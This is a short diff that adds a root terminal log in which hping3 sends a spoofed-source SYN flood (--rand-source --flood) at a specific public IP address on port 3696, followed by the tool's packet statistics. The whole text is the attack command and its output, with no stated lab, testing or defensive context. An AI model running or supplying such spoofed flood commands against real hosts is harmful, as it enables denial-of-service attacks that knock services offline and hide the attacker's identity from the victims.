@@ -1,0 +1,7 @@
+root@Georgebrown:~# sudo hping3 -S -p 3696 --rand-source --flood --count 1000 137.184.173.203
+HPING 137.184.173.203 (eth0 137.184.173.203): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 137.184.173.203 hping statistic ---
+1000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
